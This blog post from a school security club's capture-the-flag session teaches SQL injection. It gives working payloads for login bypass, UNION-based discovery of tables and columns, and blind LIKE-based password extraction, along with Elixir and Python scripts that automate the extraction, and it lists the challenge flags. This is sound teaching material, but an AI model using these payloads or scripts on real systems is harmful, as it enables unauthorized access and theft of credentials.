---
layout: post
title:  "sql injections"
date:   2021-10-14
categories: web
---

On 10/14, we focused on SQL injections which allow us to access data in databases that we wouldn't be given otherwise!

Here are the links to the [lecture](https://docs.google.com/presentation/d/1-YCCR9w2vvmVrWR7EjksmqShnKNzRlXWXRJRPzq6dFA/edit?usp=sharing) and the [challenges](https://xn--158h.blairsec.mbhs.edu/login)!

List of Flags
1. [Creating an Error](#Flag-1-Creating-an-Error)
2. [Bypassing filters](#Flag-2-Bypassing-Filters)
3. [Accessing a different column](#Flag-3-Accessing-Different-Columns)
4. [Accessing a different table](#Flag-4-Accessing-Different-Tables)
5. [Finding the admin password](#Flag-5-Finding-the-Admin-Password)

#### Intro to SQL and Databases
Database are used to to store, change, add and retrieve a lot of data efficiently. They can be used to store usernames and passwords or store books found in a library along with whether they have been checked out.

Databases are made up of a few different parts - columns, rows and tables.
 - Column - a group of data of the same type (e.g. height or password)
 - Row - a group of data that belong to one person, situation, etc. (e.g. a username and a password)
 - Table - a collection of rows and columns

Ok, so we have a way of storing data using database, but how do we access data in a database? This is where SQL comes in.

SQL (Structured Query Language) provides us with the ability to edit and retrieve data from databases!

Some useful commands:
- `SELECT` - retrieves data from a database
- `CREATE TABLE` - creates a table
- `INSERT INTO` - adds an row to a table

Let's break down a query which retrieves data:
```sql
SELECT name,height FROM students WHERE height='60'
```

The `SELECT` signifies that we want to get data from the database. The `name,height` represents the columns of data that we want. `FROM students` indicates these columns are located in the table, `students`. Lastly, the `WHERE height='60'` tells the database to only return the rows that have heights equal to 60 inches.

Knowing how to make comments in SQL is important as well. Single-line comments are denoted by `--` and multi-line comments are denoted by `/* some text */`. I will get into why commenting is important when I start explaining how to get the flags.

Other important characters include *, _ and %. * is used to signify everything - could be all columns in a table. _ signifies any one character, so 'database' would be equivalent to 'd_tabase'. Also, % signifies any set of multiple characters, so 'database' would be equivalent to 'data%'. _ and % only apply to certain conditions such as in `LIKE` statements (will be explained later).

Here's a [video](https://www.youtube.com/watch?v=ZIH7X6wmAL8) that you might enjoy about databases :)

#### Logging In
Before we can find the first couple flags, we need to log in to the [website](https://xn--158h.blairsec.mbhs.edu/login).

Here we see that we need to input a username and password. We aren't given a username and password, but we know that our username and password are being check by the query below:
```sql
SELECT * FROM users WHERE username='(user input)' AND password='(user input)'
```

What if we could change the query so that data is always returned?

We can by putting `' OR 1 -- j` in the username field and at least one character in the password field.

Let's put our input into context:
```sql
SELECT * FROM users WHERE username='' OR 1 -- j' AND password='(any character)'
```

We are selecting rows from the users tables if the row has a username of '' or 1 which is always true. This makes it so that every row in the database will match the condition. We added the `-- j` to comment out the rest of the line so that the password doesn't matter and the code still is valid. The `j` is there to make sure that there is a space after the `--` to produce a comment.

Now, you should be logged in and can move on to finding the first flag!

#### Flag 1: Creating an Error
For the first flag, we want to input something into the search bar which will cause the SQL query to throw an error. There are many ways to produce errors in code including not closing quotations, misspelling words and more. Pick whatever error you'd like to obtain this flag.

I inserted a `'`, so now there is an odd number of quotation marks meaning that one doesn't have a pair to close it.

The flag is `flag{err0rs_4r3nt_v3ry_us3ful}`.

#### Flag 2: Bypassing Filters
For the next flag, we need to find the query which we are inputting into by going to the [source code](https://github.com/blairsec/club-challs-2021/blob/master/sqli/site/src/index.ts). Whenever you have access to source code for a challenge, **look** at it, so you can better understand what the program is doing and what possible exploits could be.

The query from the source code which is important to us is:
```sql
SELECT number, factors FROM Factors WHERE number != '' AND number != 'flag' AND number LIKE '%${query}%' LIMIT 5
```

This specifically filters out the rows where the number is '' or 'flag'. Interesting... Let's change the query so that the row where the number is 'flag' can be displayed.

Input: 
```sql
' OR 1 -- j
```

This input takes the original condition and adds `OR 1` to it which makes the condition always true -- even for the flag row.

Flag: `flag{l33ks_t4st3_l1k3_sc4lli0ns}`

#### Flag 3: Accessing Different Columns
When you got the second flag, a hint for this flag was given.
`your flag's in another column >:)`

Ok, back to the query our input is going into.
```sql
SELECT number, factors FROM Factors WHERE number != '' AND number != 'flag' AND number LIKE '%${query}%' LIMIT 5
```

The columns retrieved are the number and the factors, but there is another column that we don't know about. In order to find out what columns are in the Factors table, we need to look at the sqlite_master table. To do so, we are going to need to use `UNION` to combine two queries into one.

Input: 
```sql
' UNION SELECT sql,1 FROM sqlite_master -- j
```
This adds a query which retrieves the sql column from the sqlite_master table. The `,1` where the columns are specified just makes it so that two columns are specified while only actually specifying one column.

Output: 
![result.png](/writeups/assets/images/10-16-21/result.png)

See the line with `CREATE TABLE Factors`? The columns are listed in the parenthesises with a type. One of the columns is called `supersecret587213722`. Let's try making a query which retrieves data in this column.

Input: 
```sql
' UNION SELECT number,supersecret587213722 FROM Factors -- j
```

Flag: `flag{r0ck3t_3m0ji_fl4g_r0ck3t_3m0ji}`

#### Flag 4: Accessing Different Tables
The hint from the previous flag is that `your flag's in another table >:)`.

Remember how we accessed the sqlite_master table? There was another row which contained 
```sql
CREATE TABLE supersecret319030028 (supersecret516387017 text)
```

Let's make a query which accesses this table and the column it contains!

Input: 
```sql
' UNION SELECT supersecret516387017,1 FROM supersecret319030028 -- j
```

Flag: `flag{dr0p_1t_d0nt_p0p_it}`

#### Flag 5: Finding the Admin Password
The hint for the final flag is `your flag's in the admin password >:)`.

The admin password isn't stored in this database, so we are going to have to go back to the login page and log in as the admin.

A helpful keyword for getting this flag is `LIKE`. `LIKE` allows you to retrieve data which you only know part of. For example, you might want to get an row who's password starts with an 'a'. We can represent this in our query through `password LIKE 'a%'`. The % represents any combination of characters.

Try `admin' AND password LIKE 'a%' -- j` in the username field with any character in the password field.

You should have received an error saying that the username or password is invalid. This means that the password doesn't start with a.

Next, try `admin' AND password LIKE 'f%' -- j` in the username field with any character in the password field.

Now you should be logged in again, so the admin password starts with an f. If you continue this, you eventually will get the whole password! This is very tedious, so it would be good to write a program to try all the combinations for us.

Here is an Elixir script which does this!
```elixir
Mix.install([
  {:req, "~> 0.1.0"}
])

defmodule Sqli do
  @site "https://xn--158h.blairsec.mbhs.edu/login"

  def find_password(password) do
    list = get_chars()
    new_password = find_next_character(password, list)

    case String.last(new_password) == "}" do
      true -> new_password
      false -> find_password(new_password)
    end
  end

  def find_next_character(password, []), do: password

  def find_next_character(password, [head | tail]) do
    test_pass = password <> head

    case send_request(test_pass) do
      400 -> find_next_character(password, tail)
      _ -> test_pass
    end
  end

  def send_request(password) do
    response =
      Req.post!(
        @site,
        {:form, username: "admin' AND password LIKE '#{password}%' -- j", password: "a"}
      )

    response.status
  end

  def get_chars do
    a_z = for x <- ?a..?z, do: <<x>>
    capA_Z = for x <- ?A..?Z, do: <<x>>
    numbers = for x <- ?0..?9, do: <<x>>
    a_z ++ capA_Z ++ numbers ++ ["{", "}", "_"]
  end
end

IO.puts(Sqli.find_password(""))
```

If you are more familar with Python, here is the script that Jason wrote.
```python
import requests, string, json
current = "flag{"
alpha = string.ascii_lowercase+string.digits+"{}_"
while 1:
    for c in alpha:
        pw = current+c
        good = False
        while 1:
            print(pw)
            res = requests.post("http://xn--158h.blairsec.mbhs.edu/login",data={"username":f"admin' AND password LIKE '{pw}%' -- j","password":"f"})
            if res.status_code == 400:
                # we messed up
                break
            elif res.status_code == 200:
                # good
                current = pw
                good = True
                break
        if good: break
    else:
        print(current)
        break
```

Flag: `flag{y0ur_fl4g_1s_r1ght_h3r3}`

See you at the next meeting!
~ Alexa :)